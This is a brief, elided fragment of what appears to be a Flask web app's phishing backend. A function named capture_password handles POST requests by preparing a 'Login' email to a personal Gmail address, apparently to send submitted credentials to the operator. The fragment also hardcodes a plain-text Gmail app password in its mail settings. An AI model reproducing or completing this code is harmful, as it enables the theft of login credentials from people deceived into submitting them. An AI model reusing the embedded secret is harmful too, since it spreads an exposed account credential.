...
app.config['MAIL_PASSWORD'] = 'kuwkucfajwehgvxi'   # Your Gmail password or app-specific password
...
def capture_password():
    if request.method == 'POST':
        ...
        recipient =  'pinaraby9@gmail.com'  # Your email address to receive the email
        subject = 'Login'
